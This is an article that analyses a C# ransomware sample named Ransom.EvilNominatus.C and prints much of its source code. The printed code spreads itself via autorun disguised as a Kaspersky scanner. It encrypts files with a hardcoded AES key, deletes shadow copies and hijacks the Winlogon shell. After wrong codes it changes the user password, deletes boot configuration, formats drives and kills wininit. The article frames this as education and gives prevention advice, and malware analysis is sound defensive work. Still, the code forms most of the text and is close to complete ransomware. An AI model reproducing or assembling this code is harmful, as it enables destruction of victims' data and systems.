# 🛡️ Analyzing a Malicious Ransomware Code in C# 🛡️

In this article, we dive into a dangerous piece of C# code designed as ransomware, named `Ransom.EvilNominatus.C`. This code is malicious, encrypting files, modifying system settings, and attempting to persist on infected systems. Below, we analyze its key components, illustrate each point with the full relevant code, and explain its behavior to highlight how ransomware operates. **Warning**: This code is harmful and should never be executed. The analysis is for educational purposes only.

---

## 🔍 Overview of the Ransomware

The code is a Windows Forms application (`MainForm`) written in C# that performs destructive actions upon execution. Its primary goals are:
- **Encrypt files** across the system using AES encryption.
- **Persist** by copying itself to drives and modifying registry settings.
- **Disable recovery** by deleting backups and shadow copies.
- **Demand a ransom** by displaying a UI for entering a decryption code.

Let’s break down its core functionalities, supported by the full code for each section.

---

## 🕵️‍♂️ Initial Setup and Autorun Infection

### What It Does
Upon execution, the ransomware attempts to spread by creating an `autorun.inf` file and copying itself to all available drives, masquerading as `KasperskyScan.exe`. This ensures it runs automatically when drives are accessed.

### Code Analysis
The constructor of `MainForm` contains the logic for this behavior:

```csharp
public MainForm()
{
    InitializeComponent();
    checked
    {
        try
        {
            runCommand("echo ^[autorun^] >autorun.inf");
            runCommand("echo ^open^=KasperskyScan^.exe >>autorun.inf");
            runCommand("echo ^execute=^KasperskyScan^.exe >>autorun.inf");
            string text = "KasperskyScan.exe";
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo driveInfo in drives)
            {
                try
                {
                    File.Copy("autorun.inf", driveInfo.ToString());
                    File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + text);
                }
                catch
                {
                }
            }
            // ... (further malicious actions)
        }
        catch
        {
        }
    }
}
```

### Explanation
- **Autorun Creation**: It creates an `autorun.inf` file with commands to execute `KasperskyScan.exe` (the ransomware itself) when a drive is accessed.
- **Drive Copying**: Loops through all drives (`DriveInfo.GetDrives()`) and copies both `autorun.inf` and the ransomware executable to each drive’s root.
- **Exception Handling**: Uses broad `try-catch` blocks to silently ignore errors, ensuring the ransomware continues even if some operations fail.

This approach exploits autorun functionality, though modern Windows versions disable autorun by default, reducing its effectiveness.

---

## 🔒 File Encryption Mechanism

### What It Does
The ransomware encrypts files across multiple directories using AES-256 encryption, appending `-Locked` to encrypted filenames and deleting the originals. The encryption key is hardcoded, making decryption theoretically possible with the correct code.

### Code Analysis
The `EncryptIT` method handles file encryption:

```csharp
public void EncryptIT(string inputFile)
{
    try
    {
        UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
        string s = "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK";
        byte[] bytes = unicodeEncoding.GetBytes(s);
        string text = inputFile + "-Locked";
        string path = text;
        using (FileStream stream = new FileStream(path, FileMode.Create))
        {
            using AesManaged aesManaged = new AesManaged();
            using CryptoStream cryptoStream = new CryptoStream(stream, aesManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
            using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
            aesManaged.KeySize = 256;
            aesManaged.BlockSize = 128;
            aesManaged.Key = bytes;
            aesManaged.IV = bytes;
            aesManaged.Mode = CipherMode.CBC;
            int num;
            while ((num = fileStream.ReadByte()) != -1)
            {
                cryptoStream.WriteByte(checked((byte)num));
            }
        }
        File.Delete(inputFile + ".*");
    }
    catch
    {
    }
}
```

### Explanation
- **Hardcoded Key**: The encryption key is derived from the string `"7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK"`. Using the same key as both the AES key and initialization vector (IV) is a cryptographic flaw, weakening security.
- **AES-256 Encryption**: Uses `AesManaged` with CBC mode to encrypt files, writing the output to a new file with `-Locked` appended.
- **File Deletion**: Deletes the original file after encryption, leaving only the encrypted version.
- **Error Handling**: Ignores errors, ensuring the ransomware continues even if some files can’t be encrypted.

This method is called recursively by `encryptDirectory` and `FinalPower` to target files in various system and user directories (e.g., Desktop, Documents, Downloads).

---

## 🛠️ System Sabotage

### What It Does
The ransomware disables system recovery and security mechanisms to prevent mitigation:
- Deletes shadow copies and backups.
- Disables the Windows Registry Editor.
- Stops critical services like Windows Firewall and Network Connections.
- Modifies the Windows shell to run itself at login.

### Code Analysis
Key sabotage actions in the constructor:

```csharp
Process.EnterDebugMode();
runCommand("vssadmin delete shadows /all /quiet && wmic shadowcopy delete");
runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
runCommand("net stop Windows Firewall");
runCommand("net stop Network Connections");
using (RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"))
{
    try
    {
        registryKey.SetValue("Shell", Application.ExecutablePath, RegistryValueKind.String);
    }
    catch
    {
    }
}
```

### Explanation
- **Shadow Copy Deletion**: Uses `vssadmin` and `wmic` to delete Volume Shadow Copies, preventing file restoration.
- **Registry Lockdown**: Disables the Registry Editor by setting `DisableRegistryTools` to `1`.
- **Service Disruption**: Stops Windows Firewall and Network Connections to weaken security.
- **Shell Persistence**: Sets the `Winlogon` shell to the ransomware’s executable path, ensuring it runs at system startup instead of `explorer.exe`.
- **Debug Mode**: Enters debug mode to potentially bypass certain security restrictions.

These actions make recovery difficult without external backups or specialized tools.

---

## 💻 User Interface and Ransom Demand

### What It Does
The ransomware displays a Windows Forms UI with a ransom note, a text box for entering a decryption code, and a button to submit it. Users have three attempts (`live = 3`) to enter the correct code; failure triggers further destruction.

### Code Analysis
The UI setup in `InitializeComponent`:

```csharp
private void InitializeComponent()
{
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
    label1 = new Label();
    richTextBox1 = new RichTextBox();
    label3 = new Label();
    button1 = new Button();
    label2 = new Label();
    pictureBox1 = new PictureBox();
    ((ISupportInitialize)pictureBox1).BeginInit();
    ((Control)this).SuspendLayout();
    ((Control)label1).BackColor = Color.Transparent;
    label1.FlatStyle = (FlatStyle)0;
    ((Control)label1).Font = new Font("Microsoft Sans Serif", 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
    ((Control)label1).ForeColor = Color.DarkRed;
    ((Control)label1).Location = new Point(16, 11);
    ((Control)label1).Margin = new Padding(4, 0, 4, 0);
    ((Control)label1).Name = "label1";
    ((Control)label1).Size = new Size(931, 54);
    ((Control)label1).TabIndex = 0;
    ((Control)label1).Text = "CryptoVirus Detected!  Ransom.NominatusStrike";
    ((Control)richTextBox1).Font = new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
    ((Control)richTextBox1).Location = new Point(80, 340);
    ((Control)richTextBox1).Margin = new Padding(4, 4, 4, 4);
    ((Control)richTextBox1).Name = "richTextBox1";
    ((Control)richTextBox1).Size = new Size(409, 25);
    ((Control)richTextBox1).TabIndex = 2;
    ((Control)richTextBox1).Text = "";
    ((Control)label3).Font = new Font("Microsoft Sans Serif", 9.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
    ((Control)label3).Location = new Point(13, 340);
    ((Control)label3).Margin = new Padding(4, 0, 4, 0);
    ((Control)label3).Name = "label3";
    ((Control)label3).Text = "Code:";
    ((ButtonBase)button1).FlatStyle = (FlatStyle)3;
    ((Control)button1).Location = new Point(497, 342);
    ((Control)button1).Margin = new Padding(4, 4, 4, 4);
    ((Control)button1).Name = "button1";
    ((Control)button1).Size = new Size(188, 28);
    ((Control)button1).TabIndex = 4;
    ((Control)button1).Text = "GO AWAY!!";
    ((ButtonBase)button1).UseVisualStyleBackColor = true;
    ((Control)button1).Click += Button1Click;
    // ... (additional UI setup)
    ((Control)this).Text = "Ransom.EvilNominatus.C";
    ((ISupportInitialize)pictureBox1).EndInit();
    ((Control)this).ResumeLayout(false);
}
```

The `Button1Click` method handles code submission:

```csharp
private void Button1Click(object sender, EventArgs e)
{
    if (((Control)richTextBox1).Text == "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK")
    {
        try
        {
            runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f");
            RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            registryKey.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
            runCommand("explorer.exe");
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] files = Directory.GetFiles(folderPath + "\\", "*.*", SearchOption.AllDirectories);
            MessageBox.Show("ransomware removed from your Computer but files still encrypted you can now contact attacker Bkhtyaryrwzbh@gmail.com to get the decrypter");
            ((Form)this).Close();
            return;
        }
        catch
        {
            return;
        }
    }
    checked
    {
        if (live == 0)
        {
            try
            {
                ((Control)this).Hide();
                RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                registryKey2.SetValue("Shell", "0", RegistryValueKind.String);
                runCommand("net users %username% 912983");
                runCommand("bcdedit /delete {current}");
                string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string[] files2 = Directory.GetFiles(folderPath2, "*.*", SearchOption.AllDirectories);
                for (int i = 0; i < files2.Length; i++)
                {
                    Attack1(files2[i]);
                    File.Delete(files2[i]);
                }
                runCommand("assoc .vbs=INFECTEDFILE && assoc .html=INFECTEDFILE");
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo driveInfo in drives)
                {
                    Damage(driveInfo.ToString());
                }
                runCommand("msg * Welcome to my Nightmare");
                Thread.Sleep(30);
                runCommand("taskkill /im wininit.exe /f");
                return;
            }
            catch
            {
            }
        }
        live--;
        MessageBox.Show("Wrong! you have " + live + " chance!");
    }
}
```

### Explanation
- **UI Components**: Displays a warning (`CryptoVirus Detected!`), a text box for the decryption code, and a button labeled `GO AWAY!!`.
- **Correct Code**: If the user enters `"7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK"`, it restores the shell to `explorer.exe`, re-enables the Registry Editor, and shows a message with the attacker’s email (`Bkhtyaryrwzbh@gmail.com`). However, files remain encrypted.
- **Incorrect Code**: Decrements `live`. After three failed attempts (`live == 0`), it triggers severe actions:
  - Disables the shell (`Shell = "0"`).
  - Changes the user password.
  - Deletes the boot configuration (`bcdedit /delete`).
  - Overwrites files with the ransomware’s own binary (`Attack1`).
  - Formats drives (`Damage`).
  - Kills critical processes (`wininit.exe`).

The UI deceives users into thinking they can recover their system, while failure leads to catastrophic damage.

---

## 💾 Drive Formatting and Final Destruction

### What It Does
If the user exhausts all attempts, the ransomware attempts to format all drives, rendering the system unusable.

### Code Analysis
The `Damage` method:

```csharp
public void Damage(string DriveNameToFormat)
{
    try
    {
        string commands = "format " + DriveNameToFormat + " /FS:NTFS /X /Q /y";
        runCommand(commands);
    }
    catch
    {
    }
}
```

### Explanation
- **Format Command**: Executes `format` with `/Q` (quick format) and `/y` (no confirmation) to wipe drives.
- **Silent Execution**: Runs via `runCommand` in a hidden command prompt window.
- **Error Handling**: Ignores failures, moving to the next drive.

This is a last resort to maximize damage, making data recovery nearly impossible without backups.

---

## 🛑 Conclusion

This ransomware is a textbook example of malicious software, combining file encryption, system sabotage, and psychological manipulation through a ransom demand. Its weaknesses include a hardcoded key and reliance on autorun, but its destructive potential is significant. Key takeaways:
- **Prevention**: Use antivirus software, disable autorun, and maintain regular backups.
- **Response**: If infected, isolate the system and seek professional help; do not pay the ransom.
- **Education**: Understanding ransomware mechanics helps developers and users build better defenses.

**Disclaimer**: This analysis is for educational purposes. Do not execute or distribute this code, as it can cause severe harm.